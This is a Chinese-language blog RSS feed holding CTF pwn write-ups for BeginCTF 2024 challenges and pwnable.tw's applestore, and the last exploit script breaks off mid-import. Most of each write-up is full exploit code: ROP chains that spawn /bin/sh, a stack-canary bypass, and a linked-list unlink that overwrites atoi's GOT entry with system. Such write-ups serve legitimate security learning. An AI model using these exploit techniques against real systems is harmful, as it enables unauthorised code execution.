<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>feichai的博客</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>柴柴就是世界第一可爱！！!</description>
    <pubDate>Tue, 06 Feb 2024 05:51:42 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>BeginCTF 2024 Pwn部分wp</title>
      <link>http://example.com/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/</link>
      <guid>http://example.com/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/</guid>
      <pubDate>Tue, 06 Feb 2024 05:29:53 GMT</pubDate>
      
      <description>&lt;p&gt;本Pwn小白实力不允许，只写出了几道稍微简单点的&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>本Pwn小白实力不允许，只写出了几道稍微简单点的</p><span id="more"></span><h3 id="one-byte"><a href="#one-byte" class="headerlink" title="one_byte"></a>one_byte</h3><p>溢出只能覆盖返回地址的一个字节，利用溢出，修改返回地址返回主函数继续读出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&quot;your gift: &quot;</span>)</span><br><span class="line">        flag += p.recv(<span class="number">1</span>).decode()</span><br><span class="line">        pd = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">17</span> + <span class="string">b&#x27;\x63&#x27;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;result?&quot;</span>,pd)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="gift-rop"><a href="#gift-rop" class="headerlink" title="gift_rop"></a>gift_rop</h3><p>gadget都留着，直接ret2syscall就可以get shell，因为关闭了标准输出和标准错误，重定向就可以看到输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/gift_rop&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/gift_rop&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x00000000004c50f0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f2f</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000409f9e</span></span><br><span class="line">syscall = <span class="number">0x401CE4</span></span><br><span class="line">pop_rdx_rbx =<span class="number">0x000000000047f20b</span></span><br><span class="line">ret = <span class="number">0x000000000043d1d0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040239e : xor eax, eax ; ret</span></span><br><span class="line"><span class="string">0x00000000004019d6 : add eax, 1 ; ret</span></span><br><span class="line"><span class="string">0x0000000000471268 : add eax, 2 ; ret</span></span><br><span class="line"><span class="string">0x0000000000471281 : add eax, 3 ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">xor_eax = <span class="number">0x000000000040239e</span></span><br><span class="line">add_eax_3= <span class="number">0x0000000000471281</span></span><br><span class="line">add_eax_2= <span class="number">0x0000000000471268</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment">#execve 59   eax = 59  rdi = &quot;/bin/sh\x00&quot;  rsi = 0  rdx = 0</span></span><br><span class="line">    pd = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    pd += p64(pop_rdi) + p64(binsh)</span><br><span class="line">    pd += p64(pop_rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(xor_eax)</span><br><span class="line">    pd += p64(add_eax_3) * <span class="number">19</span></span><br><span class="line">    pd += p64(add_eax_2)</span><br><span class="line"></span><br><span class="line">    pd += p64(syscall)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">b&quot;checkin problem.&quot;</span>,pd)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>strcat会在字符串后面继续添加字符串，strcpy在复制字符串后会自动加’\0’,利用这两个特性，在vul函数中先将canary的最低位字节\x00覆盖掉，然后strcat就可以绕过canary修改返回地址，最后strcpy会将canary最后一字节恢复为\x00,程序结束返回system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4011FE</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">2</span> + p64(system)</span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x39</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-applestore</title>
      <link>http://example.com/2024/01/29/pwnable-applestore/</link>
      <guid>http://example.com/2024/01/29/pwnable-applestore/</guid>
      <pubDate>Mon, 29 Jan 2024 12:08:04 GMT</pubDate>
      
      <description>&lt;p&gt;这道题对于我这个菜鸟来说收获真的很大！！！&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>这道题对于我这个菜鸟来说收获真的很大！！！</p><span id="more"></span><p>这道题的数据结构是双链表，结构体大小为0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">applePhone</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* str;</span><br><span class="line">    <span class="type">int</span> price;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">applePhone</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">applePhone</span> *<span class="title">pre</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点：当链表内的物品价格为7174时，购物车中会加入一个1￥的iPhone8，该结构体是存储在栈中的，起始地址是ebp-0x20</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-1-17065311708551.png" alt="pwnable-applestore-1"></p><p>漏洞利用：add、delete、cart、checkout都是handler中的函数，这也就意味着在调用这些函数时，他们的ebp的地址都是一样的，而且都存储着handker的ebp地址，然后buf的起始地址为ebp-0x22，也就是说，输入2个字节后，就到了iPhone8的结构体，也就是说我们能利用这个cart函数覆盖iPhone 8的结构体，结合函数中的printf就可以泄露地址</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-2.png" alt="pwnable-applestore-2"></p><p>那么就可以利用这个点，泄露libc基址和stack的地址，知识点：environ中存放着stack的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(atoi_got) + p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment">#read不会被\x00截断</span></span><br><span class="line">cart(pd)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">atoi_got_true = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = atoi_got_true - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">environ_libc = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(environ_libc) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">cart(pd)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure><p>然后再来看delete函数，实际上就是一个双链表删除的操作，v4是next指针，v5是pre指针，函数循环到要删除的结构体，假设删除iPhone8，那么就会执行</p><p>iPhone8-&gt;pre-&gt;next &#x3D; iPhone-&gt;next </p><p>iPhone8-&gt;next-&gt;pre &#x3D; iphon8-&gt;pre</p><p>那么利用这个点，如果我们将iPhone8-&gt;next覆盖为atoi_got + 0x22，iPhone8-&gt;pre覆盖为stack - 0x104 - 0x8，那么，也就等同于我们把地址为stack - 0x104的值覆盖为atoi_got + 0x22，</p><p>那么问题来了，stack - 0x104 - 0x8，stack - 0x104和atoi_got + 0x22有什么联系，为什么要覆盖成这几个值？</p><p>stack - 0x104 - 0x8 中的 -0x8 实际上是和下图中的*(_DWORD *)(v5 + 8)相对应，v5实际上就是stack - 0x104 - 0x8，减去0x8和 v5 + 8 相抵消了，即*(stack - 0x104) &#x3D; v4 &#x3D; atoi_got + 0x22</p><p>那么现在还有一个问题，为什么是atoi_got + 0x22，stack - 0x104实际上就是delete函数的ebp地址，delete函数的ebp中存储着handler函数中ebp地址，如果我们将其值覆盖为atoi_got + 0x22后，函数退出后就会将会使handler函数的ebp地址变为atoi_got + 0x22，而handler函数中的my_read(nptr, 0x15u)的nptr的起始地址就是ebp-0x22，即我们在输入的时候，输入的起始地址就是atoi_got的地址，从而我们就可以修改atoi的got表为system，紧接着在atoi执行的时候就相当于在执行system函数，并且参数就是我们输入的数据，所以我们在delete函数返回handler函数后，输入p32(system) + b’||&#x2F;bin&#x2F;sh’就可以将atoi的got表改为system，并在atoi执行的时候触发截断执行&#x2F;bin&#x2F;sh</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-3.png" alt="pwnable-applestore-3"></p><p>然后我来讲讲delete的ebp是如何得到的，这里我踩了个坑，可能是因为我用的ld.so文件是64位的，结果导致在测偏移的时候和实际偏移偏了0x20，导致我花了好几天才搞懂这个点</p><p>那在测偏移的时候肯定要先避免这个坑，先把附件的libc和ld.so给配好</p><p>用patchelf更改文件的libc和ld</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter [ld.so路径] --set-rpath [libc所在目录] [elf文件]</span><br></pre></td></tr></table></figure><p>比如我是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_i386/ld-2.23.so --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_i386/ ./applestore</span><br></pre></td></tr></table></figure><p>然后开始调试，在delete函数中下断点，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/applestore&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10104</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/applestore&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Device Number&gt; &quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">temp</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Item Number&gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>(<span class="params">temp</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got.atoi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        add(<span class="number">2</span>)</span><br><span class="line">    checkout()</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(atoi_got) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    atoi_got_true = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = atoi_got_true - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    environ_libc = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(environ_libc) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>根据打印的信息，此时stack的值为0xff86806c</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-4.png" alt="pwnable-applestore-4"></p><p>然后查看一下栈，此时的ebp指向了0xff867f68，也就是说我们要改的是0xff867f68这个地址的值</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-5.png" alt="pwnable-applestore-5"></p><p>那么stack地址为0xff86806c，要改的地址为0xff867f68，那么他们的偏移就是0xff86806c - 0xff867f68 &#x3D; 0x104</p><p>到这里基本就没什么问题了</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> 